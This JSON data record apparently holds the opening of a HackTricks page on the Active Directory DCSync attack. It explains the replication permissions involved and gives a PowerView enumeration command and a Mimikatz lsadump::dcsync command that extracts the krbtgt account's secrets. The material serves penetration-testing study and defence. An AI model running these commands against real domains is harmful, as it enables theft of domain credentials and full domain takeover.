{
  "id": "windows_hardening_f73ae66a7edc",
  "category": "windows-hardening",
  "title": "dcsync",
  "description": "# DCSync\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## DCSync\n\nThe **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.\n\n**Important Notes about DCSync:**\n\n- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol",
  "payloads": [
    "# DCSync",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## DCSync",
    "The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.",
    "**Important Notes about DCSync:**",
    "- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.",
    "- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.",
    "- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text",
    "### Enumeration",
    "Check who has these permissions using `powerview`:",
    "```bash",
    "Get-ObjectAcl -DistinguishedName \"dc=dollarcorp,dc=moneycorp,dc=local\" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}",
    "### Exploit Locally",
    "```bash",
    "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/dcsync.md"
  ]
}